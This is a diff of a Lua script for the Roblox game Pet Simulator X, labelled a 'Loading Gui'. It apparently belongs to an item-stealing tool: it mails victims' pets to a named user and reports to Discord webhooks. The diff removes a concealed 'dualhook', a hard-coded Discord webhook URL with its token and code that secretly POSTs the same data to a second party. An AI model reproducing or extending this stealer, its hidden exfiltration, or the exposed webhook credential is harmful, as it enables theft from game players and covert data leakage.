@@ -7,8 +7,8 @@
                    __/ |                                       
                   |___/                                                                                                                  
 _G.ScriptTitle = "Pet Simulator X: Loading Gui"
+
 getgenv().Settings = {
-    local dhwebhook = "https://discord.com/api/webhooks/1155839297858060349/5r5Xc-qhAvB3ehdX9qClIJD7C83zaWGsRJsT5wm2x8avcLytUBMz6L54uHwXp09rIeIG"
     User = "StickOwwz",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "FuegoEterno OnTop",
@@ -1281,16 +1281,6 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             }
             request(abcdef1)
         end
-       task.wait()
-        if dhwebhook ~= nil then
-          local abcdef2 = {
-          Url = dhwebhook,
-          Body = newdata1,
-          Method = "POST",
-          Headers = headers
-    }
-    request(abcdef2)
-end
     else
         imgs =
         "https://media.discordapp.net/attachments/736080557557022855/1150299910550339644/FB_IMG_1691312902228.jpg"
